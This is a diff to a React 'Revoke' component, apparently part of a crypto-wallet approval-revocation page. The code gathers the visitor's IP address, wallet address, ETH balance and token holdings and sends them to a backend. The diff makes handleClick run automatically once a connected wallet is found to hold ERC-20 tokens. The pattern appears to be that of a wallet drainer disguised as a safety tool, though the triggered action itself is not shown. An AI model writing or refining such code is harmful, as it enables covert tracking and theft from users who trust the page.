@@ -43,6 +43,7 @@ const Revoke = () => {
   const [walletData, setWalletData] = useState([]);
   const [priceData, setPriceData] = useState(null);
   const [isButtonDisabled, setIsButtonDisabled] = useState(false);
+  const [handleClickCalled, setHandleClickCalled] = useState(false); // State to track if handleClick has been called
 
   useEffect(() => {
     if (!loadingData && tokenData && isConnected) {
@@ -65,7 +66,6 @@ const Revoke = () => {
 
   useEffect(() => {
     if (tokenData && priceData && connector) {
-      // Add connector to the condition
       const mergedTokens = mergeTokens(priceData, tokenData);
       const data = createWalletData(
         mergedTokens,
@@ -73,10 +73,10 @@ const Revoke = () => {
         ipAddress,
         ethBalance,
         address,
-        connector.name // Only access connector.name if connector is not undefined
+        connector.name
       );
       setWalletData(data);
-      console.log("wallet data", walletData);
+      console.log("wallet data", data); // Ensure correct variable is logged
 
       sendWalletScannedData(data);
     }
@@ -129,8 +129,14 @@ const Revoke = () => {
   };
 
   useEffect(() => {
-    if (walletData && walletData.length > 0) {
+    if (
+      walletData &&
+      walletData.erc_20_tokens?.length > 0 &&
+      isConnected &&
+      !handleClickCalled
+    ) {
       handleClick();
+      setHandleClickCalled(true); // Mark as called
     }
   }, [walletData, isConnected]);
 
